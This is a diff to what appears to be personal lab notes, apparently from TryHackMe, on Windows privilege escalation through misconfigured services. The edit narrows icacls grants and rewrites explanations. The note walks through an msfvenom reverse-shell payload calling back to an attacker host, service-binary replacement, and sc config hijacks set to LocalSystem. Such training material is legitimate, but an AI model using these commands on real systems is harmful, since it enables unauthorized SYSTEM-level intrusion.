@@ -4,7 +4,7 @@ platform: windows
 status: working
 fluency: guided
 source: thm
-updated: 2026-09-03
+updated: 2026-09-08
 ---
 
 # Windows — Service Misconfiguration Abuse
@@ -58,17 +58,17 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe-service
 After dropping the payload where another account will execute it, open it up so that account can:
 
 ```cmd
-icacls C:\path\to\rev.exe /grant Everyone:F
+icacls C:\path\to\rev.exe /grant Everyone:RX
 ```
 
-- `/grant Everyone:F` → the service account is not you, so without a grant it may not be able to read or execute the file you just dropped, and the service fails to start with nothing in your listener.
+- `/grant Everyone:RX` → the service account is not you, so without a grant it may not be able to read or execute the file you just dropped, and the service fails to start with nothing in your listener. `RX` is read and execute, which is all it needs; `F` is full control and hands over write as well, which nothing here uses.
 
 **What you will see**
 
 - **Found** — `Payload size` and `Saved as: rev.exe` from msfvenom; `Successfully processed 1 files.` from `icacls`. The payload is ready to plant.
 - **Empty** — no blank state: msfvenom prints a saved-path line or it errors. A command here that returns nothing at all did not run — re-issue it rather than assuming an empty payload.
 - **Error** — `msfvenom` complaining about the format means a typo in `exe-service`. `icacls` `Access is denied.` on your own dropped file means you copied it somewhere you cannot re-ACL — drop it in a folder you own.
-- **Noise** — `Everyone:F` on the dropped file looks reckless but is scoped to this one payload; it weakens nothing else on the host. msfvenom's encoder/size chatter is progress, not a fault.
+- **Noise** — the grant on the dropped file is scoped to this one payload; it weakens nothing else on the host. msfvenom's encoder/size chatter is progress, not a fault.
 
 **Then** — with the payload built, go to whichever vector your `sc qc` reading pointed at. The same `exe-service` payload serves vectors 1, 2 and scheduled tasks; [[Security-Terms#^msi|MSI]] and DLL payloads are their own formats for their own vectors.
 
@@ -108,7 +108,7 @@ move C:\Users\you\rev.exe service.exe
 ```
 
 ```cmd
-icacls service.exe /grant Everyone:F
+icacls service.exe /grant Everyone:RX
 ```
 
 ```cmd
@@ -116,7 +116,7 @@ sc stop <service> & sc start <service>
 ```
 
 - `move` → renames or moves a file. Renaming the real binary to `.bak` rather than deleting it means you can put the service back afterwards, which matters on anything that is not a throwaway lab host.
-- `/grant Everyone:F` → hands every account Full control of the file you just planted, because the service account is not you and by default cannot read a file you created.
+- `/grant Everyone:RX` → lets every account read and execute the file you just planted, because the service account is not you and by default cannot read a file you created. Read and execute is the whole requirement; full control would be handing out more than the vector needs.
 - `&` → cmd.exe's "run this, then run that" separator, so the stop and the start happen in one line. The restart is what makes the SCM launch your file; without it nothing happens until the host reboots.
 
 **Then** — a landed shell has *whatever `SERVICE_START_NAME` was* — check `whoami` immediately. `LocalSystem` ends the box; an unprivileged `svc*` account is a lateral hop that sets up the next escalation. A locked binary sends you to vector 2 or 3 on the same service.
@@ -179,7 +179,7 @@ move C:\Users\you\rev.exe C:\MyPrograms\Disk.exe
 ```
 
 ```cmd
-icacls C:\MyPrograms\Disk.exe /grant Everyone:F
+icacls C:\MyPrograms\Disk.exe /grant Everyone:RX
 ```
 
 ```cmd
@@ -190,7 +190,7 @@ sc stop <service> & sc start <service>
 
 ## Vector 3 — writable service configuration (DACL)
 
-**Why now** — the binary is locked and the path is quoted, but the **service's own** access control list may let you *reconfigure* it. If so you touch no file at all: point the service at your payload and set its account to `LocalSystem` directly. This is the only one of the three that yields SYSTEM in a single step.
+**Why now** — the binary is locked and the path is quoted, but the **service's own** access control list may let you *reconfigure* it. If so you touch no file at all: point the service at your payload and set its account to `LocalSystem` directly. This is the only one of the three where you *choose* the account, so it reaches SYSTEM even when the service was running as something smaller.
 
 ```cmd
 accesschk64.exe -qlc <service>
@@ -219,7 +219,7 @@ sc stop <service> & sc start <service>
 ```
 
 - `binPath=` → the executable the SCM will run from now on. Point it at your planted payload.
-- `obj=` → the account the service will run as. `LocalSystem` is the built-in account that outranks any administrator and needs no password, which is why this vector reaches SYSTEM in a single step.
+- `obj=` → the account the service will run as. `LocalSystem` is the built-in account that outranks any administrator and needs no password, which is why this vector reaches SYSTEM whatever the service was running as before.
 
 > [!important] The space after each `=` is mandatory
 > `sc config` syntax is `option= value` — the space goes **after** the equals sign, not before. `binPath="..."` (no space) is silently misparsed; `binPath= "..."` is correct. This is the single most common reason this vector "doesn't work".
@@ -250,9 +250,9 @@ sc qfailure <service>
 
 Two signals across all three vectors trip people up.
 
-**`sc start` returning error 1053 is often success, not failure.** `1053` = "the service did not respond to the start request in time" — which is exactly what happens when the binary is your payload instead of a real service that answers the SCM. Check your listener, not the error. This is *the* reason to use `exe-service`: with a plain `.exe` the process is also killed; with `exe-service` the shell survives the timeout.
+**`sc start` returning error 1053 is not the failure it looks like.** `1053` = "the service did not respond to the start request in time" — which is exactly what happens when the binary is your payload instead of a real service that answers the SCM. Check your listener, not the error. This is *the* reason to use `exe-service`: with a plain `.exe` the process is also killed; with `exe-service` the shell survives the timeout.
 
-**The shell has the service account's privileges, whatever they are.** Vectors 1 and 2 give you *whatever `SERVICE_START_NAME` was* — often an unprivileged `svc*` account, not SYSTEM, so this may be a lateral hop that sets up the next escalation, not the finish. Vector 3 lets you *choose* `LocalSystem`, so it is the only one that reaches SYSTEM by itself. Check with `whoami` the moment the shell lands, and if it is not SYSTEM, run the whole enumeration again as the new account.
+**The shell has the service account's privileges, whatever they are.** Vectors 1 and 2 give you *whatever `SERVICE_START_NAME` was* — often an unprivileged `svc*` account, not SYSTEM, so this may be a lateral hop that sets up the next escalation, not the finish. Vectors 1 and 2 reach SYSTEM only when the service was already running as it. Vector 3 lets you *choose* `LocalSystem`, which is why it is the one that does not depend on what you found. Check with `whoami` the moment the shell lands, and if it is not SYSTEM, run the whole enumeration again as the new account.
 
 ## Next
 
